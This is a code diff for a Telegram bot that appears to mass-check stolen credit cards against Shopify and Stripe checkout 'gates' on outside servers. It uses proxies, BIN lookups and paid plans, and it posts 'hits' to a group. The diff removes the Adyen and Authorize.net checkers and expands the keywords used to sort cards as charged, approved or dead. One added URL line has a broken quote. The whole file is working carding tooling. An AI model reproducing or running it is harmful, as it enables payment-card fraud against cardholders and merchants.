@@ -80,10 +80,8 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-SHOPIFY_API_URL_1 = 'https://web-production-45515a.up.railway.app/shopify'
-ADYEN_API_URL = 'https://gates.valyrian.cc/triumph/check'
+SHOPIFY_API_URL_1 = https://beneficial-celebration-production-274c.up.railway.app/shopify'
 STRIPE_API_URL = 'https://gates.valyrian.cc/stripe1/check'
-AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 GITHUB_API_SITES_URL = os.getenv("GITHUB_API_SITES_URL", "")
 KEYS_FILE = "redeem_keys.json"
@@ -704,7 +702,7 @@ async def get_bin_info(bin_code, session=None):
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "🌐"}
 
 # ═══════════════════════════════════════════════════════════════
-# MODIFIED API FUNCTIONS - SLOW MODE + RETRY LOGIC + TIMEOUT FIX
+# MODIFIED API FUNCTIONS - SHOPIFY + STRIPE ONLY
 # ═══════════════════════════════════════════════════════════════
 
 async def check_shopify_api(api_url, card, site, proxy, session):
@@ -794,10 +792,27 @@ async def check_shopify_api(api_url, card, site, proxy, session):
 
                     gt = rj.get("Gateway", rj.get("gateway", "Shopify"))
 
-                    for k in ["Price", "price", "amount", "Amount", "amt", "Amt", "charged", "charge", "total"]:
-                        if k in rj and rj[k] is not None and str(rj[k]).strip():
-                            pr = str(rj[k]).strip()
-                            break
+                    # ═══════════════════════════════════════════════════════════════
+                    # FIXED PRICE EXTRACTION - More keys + better handling
+                    # ═══════════════════════════════════════════════════════════════
+                    price_keys = [
+                        "Price", "price", "amount", "Amount", "amt", "Amt", 
+                        "charged", "charge", "total", "Total", "cost", "Cost",
+                        "value", "Value", "sum", "Sum", "payment", "Payment",
+                        "order_total", "grand_total", "subtotal", "Subtotal",
+                        "transaction_amount", "paid_amount", "capture_amount",
+                        "order_amount", "billing_amount", "final_amount"
+                    ]
+                    for k in price_keys:
+                        if k in rj and rj[k] is not None:
+                            val = str(rj[k]).strip()
+                            if val and val not in ["0", "0.0", "0.00", "None", "null", "-", ""]:
+                                # Ensure price has $ symbol or add it
+                                if not val.startswith(("$", "€", "£")):
+                                    val = f"${val}"
+                                pr = val
+                                break
+                    # ═══════════════════════════════════════════════════════════════
 
                     api_status = str(rj.get("status", rj.get("Status", ""))).lower().strip()
 
@@ -806,41 +821,86 @@ async def check_shopify_api(api_url, card, site, proxy, session):
 
                 if api_status:
                     if api_status in ["charged", "approved", "success", "succeeded", "completed", "captured", "paid"]:
-                        return {"status": "Charged", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
+                        return {"status": "Charged", "message": rm, "card": card, "gateway": gt, "price": pr or "N/A"}
                     if api_status in ["declined", "dead", "rejected", "denied", "failed"]:
-                        return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
+                        return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "N/A"}
                     if api_status in ["insufficient", "insufficient_funds", "nsf"]:
-                        return {"status": "Insufficient", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
+                        return {"status": "Insufficient", "message": rm, "card": card, "gateway": gt, "price": pr or "N/A"}
                     if api_status in ["site_error", "error", "timeout", "unreachable"]:
                         return {"status": "Site Error", "message": rm, "card": card}
 
                 clean_rm = unsf(rm).lower().strip()
 
-                if any(k in clean_rm for k in ["charged", "payment succeeded", "success", "captured", "approved", "completed"]):
-                    if "not charged" in clean_rm or "declined" in clean_rm:
-                        return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
-                    return {"status": "Charged", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
+                # ═══════════════════════════════════════════════════════════════
+                # IMPROVED STATUS DETECTION - More accurate keywords
+                # ═══════════════════════════════════════════════════════════════
 
-                if any(k in clean_rm for k in ["cvv match", "avs", "security code match", "cvv correct"]):
-                    return {"status": "Approved", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
+                # CHARGED keywords
+                charged_keywords = [
+                    "charged", "payment succeeded", "success", "captured", "approved", "completed",
+                    "payment successful", "charge complete", "order confirmed", "paid",
+                    "transaction approved", "payment complete", "charge confirmed",
+                    "authorized", "authorised", "settled", "capture successful"
+                ]
+                if any(k in clean_rm for k in charged_keywords):
+                    if "not charged" in clean_rm or "declined" in clean_rm or "not approved" in clean_rm:
+                        return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "N/A"}
+                    return {"status": "Charged", "message": rm, "card": card, "gateway": gt, "price": pr or "N/A"}
 
-                if any(k in clean_rm for k in ["insufficient funds", "not enough funds", "low balance"]):
-                    return {"status": "Insufficient", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
+                # APPROVED / CVV MATCH keywords
+                approved_keywords = [
+                    "cvv match", "avs", "security code match", "cvv correct", "cvv2 match",
+                    "address verification", "3d authenticated", "challenge completed",
+                    "identifyshopper", "cvv declined", "avs declined", "partial match"
+                ]
+                if any(k in clean_rm for k in approved_keywords):
+                    return {"status": "Approved", "message": rm, "card": card, "gateway": gt, "price": pr or "N/A"}
 
-                if any(k in clean_rm for k in ["declined", "do not honor", "pick up card", "stolen", "lost", "fraud",
-                                                "expired", "invalid number", "invalid card", "call issuer",
-                                                "not permitted", "not allowed", "restricted"]):
-                    return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
+                # INSUFFICIENT FUNDS keywords
+                insufficient_keywords = [
+                    "insufficient funds", "not enough funds", "low balance", "nsf",
+                    "not sufficient funds", "insufficient", "funds", "balance too low",
+                    "over limit", "limit exceeded", "exceeds available", "no money",
+                    "low funds", "not enough money", "card limit reached"
+                ]
+                if any(k in clean_rm for k in insufficient_keywords):
+                    return {"status": "Insufficient", "message": rm, "card": card, "gateway": gt, "price": pr or "N/A"}
 
-                if any(k in clean_rm for k in ["site error", "gateway error", "not shopify", "cart failed",
-                                                "step 0", "step 1", "session error", "max retries",
-                                                "requires login", "login required", "format error"]):
+                # OTP / 3D SECURE keywords
+                otp_keywords = [
+                    "otp required", "3d secure", "authentication required", "challenge",
+                    "verify", "verification needed", "secure code", "one time password",
+                    "3ds", "sca required", "strong customer authentication", "issuer authentication"
+                ]
+                if any(k in clean_rm for k in otp_keywords):
+                    return {"status": "OTP", "message": rm, "card": card, "gateway": gt, "price": pr or "N/A"}
+
+                # DEAD keywords
+                dead_keywords = [
+                    "declined", "do not honor", "pick up card", "stolen", "lost", "fraud",
+                    "expired", "invalid number", "invalid card", "call issuer",
+                    "not permitted", "not allowed", "restricted", "blocked", "banned",
+                    "cancelled", "canceled", "abandoned", "issuer declined",
+                    "processor declined", "card declined", "transaction declined"
+                ]
+                if any(k in clean_rm for k in dead_keywords):
+                    return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "N/A"}
+
+                # SITE ERROR keywords
+                site_error_keywords = [
+                    "site error", "gateway error", "not shopify", "cart failed",
+                    "step 0", "step 1", "session error", "max retries",
+                    "requires login", "login required", "format error", "parse error",
+                    "invalid request", "missing parameter", "required field",
+                    "timeout", "connection", "unreachable", "empty response"
+                ]
+                if any(k in clean_rm for k in site_error_keywords):
                     return {"status": "Site Error", "message": rm, "card": card}
 
                 if len(clean_rm) < 3:
                     return {"status": "Site Error", "message": rm or "Empty/Invalid Response", "card": card}
 
-                return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
+                return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "N/A"}
 
         except asyncio.TimeoutError:
             if attempt < max_retries - 1:
@@ -864,173 +924,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
     return {"status": "Site Error", "message": "Max Retries Exceeded", "card": card}
 
 
-# Adyen Triumph Gate - MODIFIED WITH RETRY + INCREASED TIMEOUT
-async def check_adyen_api(card, proxy, session):
-    max_retries = 3
-    retry_delay = 2.5
-
-    for attempt in range(max_retries):
-        try:
-            proxy_url = proxy["proxy_url"] if isinstance(proxy, dict) else (proxy if proxy else None)
-            card = str(card).strip()
-            req_url = f"{ADYEN_API_URL}?card={quote(card)}"
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-                "Accept": "application/json"
-            }
-            # Tighter timeout to prevent hanging
-            adyen_timeout = aiohttp.ClientTimeout(total=25, connect=8, sock_connect=8, sock_read=15)
-
-            # Use asyncio.wait_for as extra safety net against aiohttp timeout bugs
-            async def _do_request():
-                async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=adyen_timeout, ssl=False) as resp:
-                    return await resp.text(), resp.status
-
-            text_data, status_code = await asyncio.wait_for(_do_request(), timeout=28)
-
-            if status_code in [500, 502, 503, 504]:
-                if attempt < max_retries - 1:
-                    logger.warning(f"Adyen API server error {status_code}, retrying {attempt+1}/{max_retries}...")
-                    await asyncio.sleep(retry_delay * (attempt + 1))
-                    continue
-                return {"status": "Site Error", "message": f"Server Error {status_code}", "card": card}
-
-            if status_code == 429:
-                if attempt < max_retries - 1:
-                    logger.warning(f"Adyen API rate limited, retrying {attempt+1}/{max_retries}...")
-                    await asyncio.sleep(retry_delay * 2)
-                    continue
-                return {"status": "Site Error", "message": "Rate Limited (429)", "card": card}
-
-            if status_code == 403:
-                return {"status": "Site Error", "message": "Access Denied (403)", "card": card}
-
-            if "<html" in text_data.lower() and any(k in text_data.lower() for k in ["cloudflare", "just a moment", "challenge", "captcha", "ddos"]):
-                return {"status": "Site Error", "message": "Cloudflare Blocked", "card": card}
-
-            if not text_data or not text_data.strip():
-                if attempt < max_retries - 1:
-                    await asyncio.sleep(retry_delay * (attempt + 1))
-                    continue
-                return {"status": "Site Error", "message": "Empty Response", "card": card}
-
-            gt = "Adyen"
-            pr = None
-            rm = text_data.strip()
-            api_status = None
-
-            try:
-                rj = json.loads(text_data)
-                rm = str(rj.get("response_msg",
-                         rj.get("result",
-                         rj.get("Response",
-                         rj.get("message",
-                         rj.get("error",
-                         rj.get("msg",
-                         rj.get("status",
-                         rj.get("data", ""))))))))).strip()
-                gt = rj.get("Gateway", rj.get("gateway", "Adyen"))
-                for k in ["Price", "price", "amount", "Amount", "amt", "Amt", "charged", "charge", "total"]:
-                    if k in rj and rj[k] is not None and str(rj[k]).strip():
-                        pr = str(rj[k]).strip()
-                        break
-                api_status = str(rj.get("status", rj.get("Status", ""))).lower().strip()
-            except Exception:
-                pass
-
-            if api_status:
-                if api_status in ["authorised", "authorized", "success", "completed", "captured", "settled", "paid", "approved"]:
-                    return {"status": "Charged", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
-                if api_status in ["declined", "dead", "rejected", "denied", "failed", "refused"]:
-                    return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
-                if api_status in ["insufficient", "insufficient_funds", "nsf"]:
-                    return {"status": "Insufficient", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
-
-            clean_rm = unsf(rm).lower().strip()
-
-            charged_keywords = [
-                "authorised", "authorized", "success", "payment completed", "transaction completed",
-                "approved", "accepted", "payment successful", "charge complete", "captured",
-                "settled", "completed", "payment confirmed", "order confirmed", "paid"
-            ]
-            if any(k in clean_rm for k in charged_keywords):
-                if "not authorised" in clean_rm or "declined" in clean_rm or "refused" in clean_rm:
-                    return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
-                return {"status": "Charged", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
-
-            approved_keywords = [
-                "cvv match", "security code", "invalid_cvv", "incorrect_cvv", "cvv correct",
-                "avs", "address verification", "cvv2", "cid", "match", "cvv declined",
-                "avs declined", "3d authenticated", "challenge completed", "identifyshopper"
-            ]
-            if any(k in clean_rm for k in approved_keywords):
-                return {"status": "Approved", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
-
-            insufficient_keywords = [
-                "insufficient", "funds", "balance", "low balance", "not enough",
-                "limit exceeded", "over limit", "exceeds", "nsf", "not sufficient",
-                "insufficient_funds", "no money", "low funds"
-            ]
-            if any(k in clean_rm for k in insufficient_keywords):
-                return {"status": "Insufficient", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
-
-            dead_keywords = [
-                "refused", "declined", "do not honor", "pick up card", "stolen", "lost", "fraud",
-                "not allowed", "expired", "invalid card", "invalid number", "call issuer",
-                "authentication_required", "3d secure", "otp required", "challenge",
-                "incorrect", "wrong", "denied", "rejected", "blocked", "banned",
-                "unauthorized", "forbidden", "invalid cvv", "invalid expiry",
-                "acquirer fraud", "shopper fraud", "risk", "not supported",
-                "unsupported", "cancelled", "canceled", "abandoned"
-            ]
-            if any(k in clean_rm for k in dead_keywords):
-                return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
-
-            site_error_keywords = [
-                "timeout", "connection", "unreachable", "gateway error",
-                "server error", "internal error", "service unavailable", "bad gateway",
-                "empty response", "no response", "format error", "parse error",
-                "invalid request", "missing parameter", "required field"
-            ]
-            if any(k in clean_rm for k in site_error_keywords):
-                return {"status": "Site Error", "message": rm, "card": card}
-
-            if len(clean_rm) < 5 or clean_rm in ["ok", "done", "yes", "true"]:
-                return {"status": "Dead", "message": rm or "Unknown Response", "card": card, "gateway": gt, "price": pr or "-"}
-            return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr or "-"}
-
-        except asyncio.TimeoutError:
-            if attempt < max_retries - 1:
-                logger.warning(f"Adyen API timeout, retrying {attempt+1}/{max_retries}...")
-                await asyncio.sleep(retry_delay * (attempt + 1))
-                continue
-            return {"status": "Site Error", "message": "API Timeout", "card": card}
-        except aiohttp.ClientConnectorError as e:
-            if attempt < max_retries - 1:
-                logger.warning(f"Adyen connector error: {e}, retrying {attempt+1}/{max_retries}...")
-                await asyncio.sleep(retry_delay * (attempt + 1))
-                continue
-            return {"status": "Site Error", "message": f"Proxy/Connector Error", "card": card}
-        except aiohttp.ServerDisconnectedError as e:
-            if attempt < max_retries - 1:
-                logger.warning(f"Adyen server disconnected, retrying {attempt+1}/{max_retries}...")
-                await asyncio.sleep(retry_delay * (attempt + 1))
-                continue
-            return {"status": "Site Error", "message": "Server Disconnected", "card": card}
-        except aiohttp.ClientError as e:
-            if attempt < max_retries - 1:
-                logger.warning(f"Adyen API connection error, retrying {attempt+1}/{max_retries}...")
-                await asyncio.sleep(retry_delay * (attempt + 1))
-                continue
-            return {"status": "Site Error", "message": f"Connection Error: {str(e)[:30]}", "card": card}
-        except Exception as e:
-            if attempt < max_retries - 1:
-                logger.warning(f"Adyen API error: {e}, retrying {attempt+1}/{max_retries}...")
-                await asyncio.sleep(retry_delay * (attempt + 1))
-                continue
-            return {"status": "Site Error", "message": f"System Error: {str(e)[:30]}", "card": card}
-
-    return {"status": "Site Error", "message": "Max Retries Exceeded", "card": card}
 async def check_stripe_api(card, proxy, session):
     max_retries = 3
     retry_delay = 5.0
@@ -1075,7 +968,7 @@ async def check_stripe_api(card, proxy, session):
                     return {"status": "Site Error", "message": "Empty Response", "card": card}
 
                 gt = "Stripe"
-                pr = STRIPE_PRICE
+                pr = "$1.00"
                 rm = text_data.strip()
                 api_status = None
 
@@ -1090,10 +983,22 @@ async def check_stripe_api(card, proxy, session):
                              rj.get("status",
                              rj.get("data", ""))))))))).strip()
                     gt = rj.get("Gateway", rj.get("gateway", "Stripe"))
-                    for k in ["Price", "price", "amount", "Amount", "amt", "Amt", "charged", "charge", "total"]:
-                        if k in rj and rj[k] is not None and str(rj[k]).strip():
-                            pr = str(rj[k]).strip()
-                            break
+
+                    # Fixed price extraction for Stripe
+                    price_keys = [
+                        "Price", "price", "amount", "Amount", "amt", "Amt", 
+                        "charged", "charge", "total", "Total", "cost", "Cost",
+                        "value", "Value", "payment", "Payment"
+                    ]
+                    for k in price_keys:
+                        if k in rj and rj[k] is not None:
+                            val = str(rj[k]).strip()
+                            if val and val not in ["0", "0.0", "0.00", "None", "null", "-", ""]:
+                                if not val.startswith(("$", "€", "£")):
+                                    val = f"${val}"
+                                pr = val
+                                break
+
                     api_status = str(rj.get("status", rj.get("Status", ""))).lower().strip()
                 except Exception:
                     pass
@@ -1108,46 +1013,60 @@ async def check_stripe_api(card, proxy, session):
 
                 clean_rm = unsf(rm).lower().strip()
 
+                # CHARGED keywords
                 charged_keywords = [
                     "succeeded", "success", "payment succeeded", "charged", "completed",
                     "approved", "transaction approved", "payment complete", "charge complete",
                     "payment successful", "order confirmed", "captured", "settled",
-                    "paid", "payment confirmed", "charge confirmed"
+                    "paid", "payment confirmed", "charge confirmed", "authorized"
                 ]
                 if any(k in clean_rm for k in charged_keywords):
                     if "not charged" in clean_rm or "declined" in clean_rm or "not succeeded" in clean_rm:
                         return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr}
                     return {"status": "Charged", "message": rm, "card": card, "gateway": gt, "price": pr}
 
+                # APPROVED keywords
                 approved_keywords = [
                     "cvv match", "security code", "invalid_cvv", "incorrect_cvv", "cvv correct",
                     "avs", "address verification", "cvv2", "cid", "match", "incorrect_cvc",
-                    "invalid_cvc", "cvc_check", "cvv_check", "zip_check"
+                    "invalid_cvc", "cvc_check", "cvv_check", "zip_check", "3d authenticated"
                 ]
                 if any(k in clean_rm for k in approved_keywords):
                     return {"status": "Approved", "message": rm, "card": card, "gateway": gt, "price": pr}
 
+                # INSUFFICIENT keywords
                 insufficient_keywords = [
                     "insufficient", "funds", "balance", "low balance", "not enough",
                     "limit exceeded", "over limit", "exceeds", "nsf", "not sufficient",
-                    "insufficient_funds", "no money", "low funds"
+                    "insufficient_funds", "no money", "low funds", "card limit"
                 ]
                 if any(k in clean_rm for k in insufficient_keywords):
                     return {"status": "Insufficient", "message": rm, "card": card, "gateway": gt, "price": pr}
 
+                # OTP keywords
+                otp_keywords = [
+                    "otp required", "3d secure", "authentication required", "challenge",
+                    "verify", "verification needed", "secure code", "one time password",
+                    "3ds", "sca required", "strong customer authentication"
+                ]
+                if any(k in clean_rm for k in otp_keywords):
+                    return {"status": "OTP", "message": rm, "card": card, "gateway": gt, "price": pr}
+
+                # DEAD keywords
                 dead_keywords = [
                     "declined", "do not honor", "pick up card", "stolen", "lost", "fraud",
                     "not allowed", "expired", "processor_declined", "card_declined",
                     "invalid account", "invalid number", "call issuer",
-                    "authentication_required", "3d secure", "otp required", "challenge",
+                    "authentication_required", "otp required", "challenge",
                     "incorrect", "wrong", "denied", "rejected", "blocked", "banned",
                     "unauthorized", "forbidden", "invalid cvv", "invalid expiry",
                     "processing_error", "processing error", "gateway error",
-                    "issuer_declined", "issuer declined", "not permitted"
+                    "issuer_declined", "issuer declined", "not permitted", "cancelled"
                 ]
                 if any(k in clean_rm for k in dead_keywords):
                     return {"status": "Dead", "message": rm, "card": card, "gateway": gt, "price": pr}
 
+                # SITE ERROR keywords
                 site_error_keywords = [
                     "timeout", "connection", "unreachable", "refused", "gateway error",
                     "server error", "internal error", "service unavailable", "bad gateway",
@@ -1182,95 +1101,6 @@ async def check_stripe_api(card, proxy, session):
             return {"status": "Site Error", "message": f"System Error: {str(e)[:30]}", "card": card}
 
     return {"status": "Site Error", "message": "Max Retries Exceeded", "card": card}
-
-
-# AuthNet Cyber Source - MODIFIED WITH RETRY + INCREASED TIMEOUT
-AUTHNET_PRICE = "$20.00"
-
-async def check_authnet_api(card, proxy, session):
-    max_retries = 3
-    retry_delay = 4.0
-
-    for attempt in range(max_retries):
-        try:
-            proxy_url = proxy["proxy_url"] if isinstance(proxy, dict) else (proxy if proxy else None)
-            card = str(card).strip()
-            req_url = f"{AUTHNET_API_URL}?cc={quote(card)}&amount=20&amt=20&price=20"
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "application/json"
-            }
-            authnet_timeout = aiohttp.ClientTimeout(total=80, connect=15, sock_connect=15, sock_read=50)
-
-            async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=authnet_timeout, ssl=False) as resp:
-                text_data = await resp.text()
-
-                if resp.status in [500, 502, 503, 504]:
-                    if attempt < max_retries - 1:
-                        logger.warning(f"AuthNet API server error {resp.status}, retrying {attempt+1}/{max_retries}...")
-                        await asyncio.sleep(retry_delay * (attempt + 1))
-                        continue
-                    return {"status": "Site Error", "message": f"Server Error {resp.status}", "card": card}
-
-                if "<html" in text_data.lower():
-                    return {"status": "Site Error", "message": "HTML Blocked", "card": card}
-
-                if not text_data.strip():
-                    if attempt < max_retries - 1:
-                        await asyncio.sleep(retry_delay * (attempt + 1))
-                        continue
-                    return {"status": "Site Error", "message": "Empty Response", "card": card}
-
-                rm = text_data.strip()
-                try:
-                    rj = json.loads(text_data)
-                    rm = str(rj.get("response_msg",
-                             rj.get("result",
-                             rj.get("Response",
-                             rj.get("message",
-                             rj.get("error",
-                             rj.get("msg",
-                             rj.get("status", text_data)))))))).strip()
-                except Exception:
-                    pass
-
-                clean_rm = unsf(rm).lower().strip()
-
-                if any(k in clean_rm for k in ["this transaction has been approved", "charged", "success", "payment succeeded", "completed", "approved"]):
-                    return {"status": "Charged", "message": rm, "card": card, "gateway": "Cyber Source", "price": AUTHNET_PRICE}
-                if any(k in clean_rm for k in ["insufficient funds", "insufficient_funds", "funds", "balance", "low balance", "nsf"]):
-                    return {"status": "Insufficient", "message": rm, "card": card, "gateway": "Cyber Source", "price": AUTHNET_PRICE}
-                if any(k in clean_rm for k in ["declined", "do not honor", "stolen", "lost", "expired", "invalid number",
-                                                "suspected fraud", "card code is invalid", "authentication_required", "3d secure"]):
-                    return {"status": "Dead", "message": rm, "card": card, "gateway": "Cyber Source", "price": AUTHNET_PRICE}
-                if any(k in clean_rm for k in ["error", "failed", "timeout", "connection", "unreachable", "not found"]):
-                    if attempt < max_retries - 1:
-                        await asyncio.sleep(retry_delay * (attempt + 1))
-                        continue
-                    return {"status": "Site Error", "message": rm, "card": card}
-                return {"status": "Dead", "message": rm or "Unknown Response", "card": card, "gateway": "Cyber Source", "price": AUTHNET_PRICE}
-
-        except asyncio.TimeoutError:
-            if attempt < max_retries - 1:
-                logger.warning(f"AuthNet API timeout, retrying {attempt+1}/{max_retries}...")
-                await asyncio.sleep(retry_delay * (attempt + 1))
-                continue
-            return {"status": "Site Error", "message": "API Timeout", "card": card}
-        except aiohttp.ClientError as e:
-            if attempt < max_retries - 1:
-                logger.warning(f"AuthNet API connection error, retrying {attempt+1}/{max_retries}...")
-                await asyncio.sleep(retry_delay * (attempt + 1))
-                continue
-            return {"status": "Site Error", "message": f"Connection Error: {str(e)[:30]}", "card": card}
-        except Exception as e:
-            if attempt < max_retries - 1:
-                logger.warning(f"AuthNet API error: {e}, retrying {attempt+1}/{max_retries}...")
-                await asyncio.sleep(retry_delay * (attempt + 1))
-                continue
-            return {"status": "Site Error", "message": f"System Error: {str(e)[:30]}", "card": card}
-
-    return {"status": "Site Error", "message": "Max Retries Exceeded", "card": card}
-
 
 async def check_proxy_real(proxy_dict, session, test_card=TEST_CARD, timeout=15):
     proxy_url = proxy_dict.get("proxy_url") if isinstance(proxy_dict, dict) else proxy_dict
@@ -1404,43 +1234,33 @@ async def check_card_real(card, sites, proxies, session, gateway_name, uid):
 
             continue
 
-        return {"status": "Site Error", "message": last_error, "card": card, "gateway": gateway_name, "price": "-"}
+        return {"status": "Site Error", "message": last_error, "card": card, "gateway": gateway_name, "price": "N/A"}
 
-    else:
+    elif gateway_name == "Stripe":
         try:
-            if gateway_name == "AuthNet":
-                res = await check_authnet_api(card, p_url, session)
-            elif gateway_name == "Adyen":
-                res = await check_adyen_api(card, p_url, session)
-            elif gateway_name == "Stripe":
-                res = await check_stripe_api(card, p_url, session)
-            else:
-                return {"status": "Dead", "message": "Unknown Gateway", "card": card}
-
+            res = await check_stripe_api(card, p_url, session)
             status = res.get("status")
 
-            max_retries = 3 if gateway_name in ["Adyen", "Stripe", "AuthNet"] else 1
+            max_retries = 3
             for attempt in range(max_retries):
                 if status != "Site Error":
                     break
                 if proxies and len(proxies) > 1:
                     p_dict2 = random.choice([p for p in proxies if p != p_dict])
                     p_url2 = p_dict2["proxy_url"] if p_dict2 else None
-                    if gateway_name == "AuthNet":
-                        res = await check_authnet_api(card, p_url2, session)
-                    elif gateway_name == "Adyen":
-                        res = await check_adyen_api(card, p_url2, session)
-                    elif gateway_name == "Stripe":
-                        res = await check_stripe_api(card, p_url2, session)
+                    res = await check_stripe_api(card, p_url2, session)
                     status = res.get("status")
                     if status == "Site Error" and attempt < max_retries - 1:
                         await asyncio.sleep(1.5)
 
             if status == "Site Error":
-                return {"status": "Site Error", "message": res.get("message", "Gateway Failed"), "card": card, "gateway": gateway_name, "price": "-"}
+                return {"status": "Site Error", "message": res.get("message", "Gateway Failed"), "card": card, "gateway": gateway_name, "price": "N/A"}
             return res
         except Exception as e:
-            return {"status": "Site Error", "message": f"Check Failed: {str(e)[:30]}", "card": card, "gateway": gateway_name, "price": "-"}
+            return {"status": "Site Error", "message": f"Check Failed: {str(e)[:30]}", "card": card, "gateway": gateway_name, "price": "N/A"}
+
+    else:
+        return {"status": "Dead", "message": "Unknown Gateway", "card": card}
 
 
 async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session, user_name="User"):
@@ -1448,20 +1268,19 @@ async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session, user_
     try:
         bi = await get_bin_info(card.split("|")[0][:6], session)
 
-        display_gate = gateway
-        if gateway == "AuthNet":
-            display_gate = "Cyber Source"
-
+        # ═══════════════════════════════════════════════════════════════
+        # FIXED PRICE DISPLAY - Never show 0.00
+        # ═══════════════════════════════════════════════════════════════
         if gateway == "Shopify":
-            display_price = price if price and price != "-" else "-"
-        elif gateway == "Adyen":
-            display_price = "-"
+            if price and price not in ["-", "None", "null", "0", "0.0", "0.00", "", "N/A"]:
+                display_price = price
+            else:
+                display_price = "N/A"
         elif gateway == "Stripe":
-            display_price = "$1.00"
-        elif gateway == "AuthNet":
-            display_price = "$20.00"
+            display_price = price if price and price not in ["-", "None", "null", "0", "0.0", "0.00", "", "N/A"] else "$1.00"
         else:
-            display_price = price or "-"
+            display_price = price if price and price not in ["-", "None", "null", "0", "0.0", "0.00", "", "N/A"] else "N/A"
+        # ═══════════════════════════════════════════════════════════════
 
         hit_emoji = random.choice([CE_PARTY, CE_CROWN, CE_DIAMOND, CE_STAR, CE_FLASH, CE_SPARKLES, CE_BOOM])
 
@@ -1469,7 +1288,7 @@ async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session, user_
 ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
 <b>𝗥𝗲𝘀𝘂𝗹𝘁 ➔</b> <code>𝗢𝗿𝗱𝗲𝗿 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱</code>
 <b>𝗣𝗿𝗶𝗰𝗲 ➔</b> <code>{display_price}</code>
-<b>𝗚𝗮𝘁𝗲 ➔</b> <code>{display_gate} 𝗣𝗮𝘆𝗺𝗲𝗻𝘁𝘀</code>
+<b>𝗚𝗮𝘁𝗲 ➔</b> <code>{gateway} 𝗣𝗮𝘆𝗺𝗲𝗻𝘁𝘀</code>
 ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
 <b>𝗖𝗮𝗿𝗱 ➔</b> <code>{card}</code>
 <b>𝗕𝗜𝗡 ➔</b> <code>{bi.get("brand", "-")} | {bi.get("type", "-")} | {bi.get("level", "-")}</code>
@@ -1489,7 +1308,6 @@ async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session, user_
                 logger.error(f"Failed to send hit to group: {e}")
     except Exception as e:
         logger.error(f"Hit send error: {e}")
-
 
 async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global _MAINTENANCE_MODE
@@ -1522,13 +1340,17 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         cl = get_cc_limit(await get_user_plan(uid), uid)
         if len(cards) > cl: cards = cards[:cl]
         PENDING_FILES[uid] = cards
+
+        # ═══════════════════════════════════════════════════════════════
+        # MODIFIED - Only Shopify and Stripe buttons
+        # ═══════════════════════════════════════════════════════════════
         kb = [
             [InlineKeyboardButton("Shopify (Charge)", callback_data="gate:Shopify", style="success", icon_custom_emoji_id="5445388803223091254")],
-            [InlineKeyboardButton("Adyen (Triumph)", callback_data="gate:Adyen", style="success", icon_custom_emoji_id="5445388803223091254")],
             [InlineKeyboardButton("Stripe ($1.00)", callback_data="gate:Stripe", style="success", icon_custom_emoji_id="5447453226498552490")],
-            [InlineKeyboardButton("Cyber Source ($20.00)", callback_data="gate:AuthNet", style="primary", icon_custom_emoji_id="5447453226498552490")],
             [InlineKeyboardButton("Cancel", callback_data="gate:cancel", style="danger", icon_custom_emoji_id="5269531045165816230")]
         ]
+        # ═══════════════════════════════════════════════════════════════
+
         await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
     except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
 
